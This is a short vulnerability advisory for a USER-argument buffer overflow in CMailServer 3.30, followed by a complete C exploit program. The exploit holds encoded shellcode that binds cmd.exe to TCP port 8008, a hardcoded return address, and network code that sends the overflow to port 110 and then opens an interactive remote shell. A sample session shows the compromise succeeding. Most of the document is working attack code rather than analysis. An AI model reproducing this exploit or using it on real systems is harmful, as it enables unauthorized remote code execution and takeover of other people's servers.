source: http://www.securityfocus.com/bid/4789/info

CMailServer is vulnerable to a buffer overflow condition. It has been reported that the CMailServer does not perform proper bounds checking on the USER argument.

It is possible for a remote malicious attacker to craft a request that will result in code execution on the vulnerable system.

This issue has been reported in CMailServer 3.30. Other versions may also be affected. 

/*
        cmeexp.c
        May 20, 2002

        CMailServer 3.30 uses sprintf() without any previous
        bounds checking while testing for the presence of the 
        passed USER argument's home directory within 'mail'..

        sprintf(%s\\mail\\%s, CMail path ptr, USER arg ptr)

        you know how the story goes, we can overwrite some
        serious EIP action..

        USER <510 bytes><EIP>

        the payload is on the right as I didn't bother finding
        or making one fit on the left


	[xx@xxxx cmail]$ ./cmeexp the.man
	CMailServer 3.30 remote 'root' exploit (05/20/2002)
	2c79cbe14ac7d0b8472d3f129fa1df55@hushmail.com
	
	
	connecting...
	
	connected.. sending code
	
	code dumped..
	
	connecting to port 8008...
	success! izn0rw3ned!
	
	Microsoft Windows 2000 [Version 5.00.2195]
	(C) Copyright 1985-2000 Microsoft Corp.
	
	E:\Program Files\CMailServer>date
	The current date is: Mon 20/05/2002 
	Enter the new date: (dd-mm-yy)

*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/errno.h>

/* Win2k SP2 + all hotfixes up until May 20th */
/* you've got one shot at this as cmail is    */
/* going down if you miss..                   */

/* this is the most consistant EIP hit on my  */
/* test machine although freshly booted she   */
/* tended to be "\x6d\xa7\xdb\x02"	      */

/* try in offsets of 0x100000 if you must..   */

#define EIP "\x6d\xa7\x0e\x03"

/* everything all rolled into one.. bind's cmd.exe  */
/* to port 8008.. this is a modified version of the */
/* shellcode created by |Zan's excellent generator  */

char shell[] =
"\x55\x53\x45\x52\x20"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x83\xee\x7f\x83\xee\x7f\x83\xee\x7f\x83\xee\x7f"
"\x83\xee\x7f\x83\xee\x7f\x83\xee\x7f\x83\xee\x7f\x83\xee"
"\x7f\x83\xee\x4c\xff\xd6"EIP"\x55\x8b\xec\x68\x5e\x56\xc3"
"\x90\x54\x59\xff\xd1\x58\x33\xc9\xb1\x1c\x90\x90\x90\x90"
"\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04\x90\x90\x90\xac"
"\x34\x13\xaa\xe2\xfa\xfb\x13\x13\x13\x13\x4e\x92\xfe\xca"
"\x32\x53\x13\x9e\xa6\xe1\x37\x53\x13\x9e\xae\xe9\x37\x53"
"\x13\x79\x14\x83\x83\x83\x83\x4a\xfb\xc1\x11\x13\x13\x9e"
"\xa6\x39\x36\x53\x13\x9e\xae\x20\x36\x53\x13\x79\x19\x83"
"\x83\x83\x83\x4a\xfb\xa9\x11\x13\x13\x79\x13\x9e\xa6\xca"
"\x36\x53\x13\x45\x9e\xa6\xf6\x36\x53\x13\x45\x9e\xa6\xfa"
"\x36\x53\x13\x45\xec\x86\x20\x36\x53\x13\x79\x13\x9e\xa6"
"\xca\x36\x53\x13\x45\x9e\xa6\xfe\x36\x53\x13\x45\x9e\xa6"
"\xe2\x36\x53\x13\x45\xec\x86\x20\x36\x53\x13\xd4\x96\xe6"
"\x36\x53\x13\x57\x13\x13\x13\x9e\xa6\xe6\x36\x53\x13\x45"
"\xec\x86\x24\x36\x53\x13\x9e\xa6\x3e\x35\x53\x13\xbe\x43"
"\xec\x86\x40\x36\x53\x13\x9e\xa6\x22\x35\x53\x13\xbe\x43"
"\xec\x86\x40\x36\x53\x13\x9e\xa6\xe2\x36\x53\x13\x9e\xae"
"\x3e\x35\x53\x13\xb6\x9e\xa6\xf6\x36\x53\x13\xbe\x9e\xae"
"\x22\x35\x53\x13\xb8\x9e\xae\x26\x35\x53\x13\xb8\xd4\x96"
"\x36\x35\x53\x13\x13\x13\x13\x13\xd4\x96\x32\x35\x53\x13"
"\x12\x12\x13\x13\x9e\xa6\x2a\x35\x53\x13\x45\x9e\xa6\xe6"
"\x36\x53\x13\x45\x79\x13\x79\x13\x79\x03\x79\x12\x79\x13"
"\x79\x13\x9e\xa6\x5a\x35\x53\x13\x45\x79\x13\xec\x86\x28"
"\x36\x53\x13\x7b\x13\x33\x13\x13\x83\x7b\x13\x11\x13\x13"
"\xec\x86\x50\x36\x53\x13\x9a\x96\x42\x35\x53\x13\x20\xd3"
"\x43\x53\x43\x53\x43\xec\x86\xe9\x37\x53\x13\x43\x48\x79"
"\x03\x9e\xa6\xda\x36\x53\x13\x45\x40\xec\x86\xed\x37\x53"
"\x13\x79\x10\x40\xec\x86\x11\x36\x53\x13\x9e\xa6\x46\x35"
"\x53\x13\x45\x9e\xa6\xda\x36\x53\x13\x45\x40\xec\x86\x15"
"\x36\x53\x13\x9e\xae\x4a\x35\x53\x13\xb8\x20\xd3\x43\x9e"
"\xae\x76\x35\x53\x13\x44\x43\x43\x43\x9e\xa6\xfa\x36\x53"
"\x13\xbe\x43\xec\x86\x2c\x36\x53\x13\x79\x23\xec\x86\x5c"
"\x36\x53\x13\xf8\x5e\x83\x83\x83\x20\xd3\x43\x9e\xae\x76"
"\x35\x53\x13\x44\x43\x43\x43\x9e\xa6\xfa\x36\x53\x13\xbe"
"\x43\xec\x86\x2c\x36\x53\x13\x79\x43\xec\x86\x5c\x36\x53"
"\x13\x90\xae\x76\x35\x53\x13\x11\x1c\x91\x04\x12\x13\x13"
"\x92\xae\x76\x35\x53\x13\x12\x33\x13\x13\x61\x1d\x83\x83"
"\x83\x83\xd4\x96\x76\x35\x53\x13\x13\x33\x13\x13\x79\x13"
"\x98\x96\x76\x35\x53\x13\x9e\xae\x76\x35\x53\x13\x44\x43"
"\x98\x96\x42\x35\x53\x13\x43\x9e\xa6\xfa\x36\x53\x13\xbe"
"\x43\xec\x86\x54\x36\x53\x13\x79\x43\xec\x86\x5c\x36\x53"
"\x13\x98\x96\x76\x35\x53\x13\x79\x13\x43\x9e\xa6\x42\x35"
"\x53\x13\xbe\x43\x9e\xa6\x4a\x35\x53\x13\xbe\x43\xec\x86"
"\x19\x36\x53\x13\x79\x13\x9e\xae\x76\x35\x53\x13\x44\x79"
"\x13\x79\x13\x79\x13\x9e\xa6\xfa\x36\x53\x13\xbe\x43\xec"
"\x86\x2c\x36\x53\x13\x79\x43\xec\x86\x5c\x36\x53\x13\x20"
"\xda\x2a\x9e\x76\x35\x53\x13\x1c\x94\x74\xec\xec\xec\x79"
"\x13\x7b\x13\x33\x13\x13\x83\x9e\xa6\x42\x35\x53\x13\xbe"
"\x43\x9e\xa6\x4a\x35\x53\x13\xbe\x43\xec\x86\x1d\x36\x53"
"\x13\x9a\x96\x72\x35\x53\x13\x79\x13\x9e\xae\x76\x35\x53"
"\x13\x44\x43\x9e\xa6\x42\x35\x53\x13\xbe\x43\x9e\xa6\xfe"
"\x36\x53\x13\xbe\x43\xec\x86\x58\x36\x53\x13\x79\x43\xec"
"\x86\x5c\x36\x53\x13\x79\x13\x98\x96\x72\x35\x53\x13\x9e"
"\xae\x76\x35\x53\x13\x44\x43\x98\x96\x42\x35\x53\x13\x43"
"\x9e\xa6\xfa\x36\x53\x13\xbe\x43\xec\x86\x54\x36\x53\x13"
"\x79\x43\xec\x86\x5c\x36\x53\x13\xfa\xaa\xed\xec\xec\x9e"
"\xa6\x4a\x35\x53\x13\xbe\x43\xec\x86\x01\x36\x53\x13\x9e"
"\xa6\x4e\x35\x53\x13\xbe\x43\xec\x86\x01\x36\x53\x13\x79"
"\x13\xec\x86\x44\x36\x53\x13\x42\x45\x7b\xd3\xf1\x56\x13"
"\x83\x49\xec\x01\x43\x48\x4a\x44\x4d\x42\x45\x40\x7b\xd7"
"\xf1\x56\x13\x83\x49\xec\x01\x43\xbf\x97\xd3\x66\xe8\x4b"
"\xb8\x4a\xf1\xfa\xd0\x44\x40\x5c\x50\x58\x20\x21\x13\x60"
"\x7c\x70\x78\x76\x67\x13\x71\x7a\x7d\x77\x13\x7f\x7a\x60"
"\x67\x76\x7d\x13\x72\x70\x70\x76\x63\x67\x13\x60\x76\x7d"
"\x77\x13\x61\x76\x70\x65\x13\x70\x7f\x7c\x60\x76\x60\x7c"
"\x70\x78\x76\x67\x13\x58\x56\x41\x5d\x56\x5f\x20\x21\x13"
"\x50\x61\x76\x72\x67\x76\x43\x7a\x63\x76\x13\x54\x76\x67"
"\x40\x67\x72\x61\x67\x66\x63\x5a\x7d\x75\x7c\x52\x13\x50"
"\x61\x76\x72\x67\x76\x43\x61\x7c\x70\x76\x60\x60\x52\x13"
"\x43\x76\x76\x78\x5d\x72\x7e\x76\x77\x43\x7a\x63\x76\x13"
"\x54\x7f\x7c\x71\x72\x7f\x52\x7f\x7f\x7c\x70\x13\x41\x76"
"\x72\x77\x55\x7a\x7f\x76\x13\x44\x61\x7a\x67\x76\x55\x7a"
"\x7f\x76\x13\x40\x7f\x76\x76\x63\x13\x50\x7f\x7c\x60\x76"
"\x5b\x72\x7d\x77\x7f\x76\x13\x56\x6b\x7a\x67\x43\x61\x7c"
"\x70\x76\x60\x60\x13\x50\x7c\x77\x76\x77\x33\x71\x6a\x33"
"\x6f\x49\x72\x7d\x33\x2f\x7a\x69\x72\x7d\x53\x77\x76\x76"
"\x63\x69\x7c\x7d\x76\x3d\x7c\x61\x74\x2d\x11\x13\x0c\x5b"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x1f\x13"
"\x13\x13\x13\x13\x13\x13\x12\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x50\x5e"
"\x57\x3d\x56\x4b\x56\x13\x13\x13\x13\x13\x03\x13\x13\x13"
"\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13\x13"
"\x13\x13\x1a\x1a\x1a\x1a\x1a\x90\x90\x90\x0d\x0a";

main(char argc, char **argv){
        int fd;
        int bufsize = 1024;
        int buffer = malloc(bufsize);
        struct sockaddr_in sin;
        struct hostent *he;
        struct in_addr in;

        printf("CMailServer 3.30 remote 'root' exploit (05/20/2002)\n");
        printf("2c79cbe14ac7d0b8472d3f129fa1df55@hushmail.com\n\n\n");

        if (argc < 2){
                printf("Usage: <hostname>\n");
                exit(-1);
        }

        if((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){perror("socket error");exit(-1);}

        if ((he = gethostbyname(argv[1])) != NULL){memcpy (&in, he->h_addr, he->h_length);}
        else
        if ((inet_aton(argv[1], &in)) < 0){printf("unable to resolve host");exit(-1);}

        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(inet_ntoa(in));
        sin.sin_port = htons(110);
 
        printf("connecting...\n");
        if(connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0){perror("connection error");exit(-1);}
 
        printf("\nconnected.. sending code\n\n");
        if(write(fd, shell, strlen(shell)) < strlen(shell)){perror("write error");exit(-1);}
        printf("code dumped..\n\n");

        close(fd);

        if((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){perror("socket error");exit(-1);}

        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(argv[1]);
        sin.sin_port = htons(8008);

        printf("connecting to tcp port 8008...\n");
        sleep(1);
        if(connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0){printf("exploit failed.. adjust EIP?\n\n");exit(-1);}
        printf("success! izn0rw3ned!\n\n");

        while(1) {
                fd_set input;

                FD_SET(0,&input);
                FD_SET(fd,&input);
                if((select(fd+1,&input,NULL,NULL,NULL))<0) {
                        if(errno==EINTR) continue;
                        printf("connection reset\n"); fflush(stdout);
                        exit(1);
                }
                if(FD_ISSET(fd,&input))
                        write(1,buffer,read(fd,buffer,bufsize));
                if(FD_ISSET(0,&input))
                        write(fd,buffer,read(0,buffer,bufsize));
        }

        close(fd);

}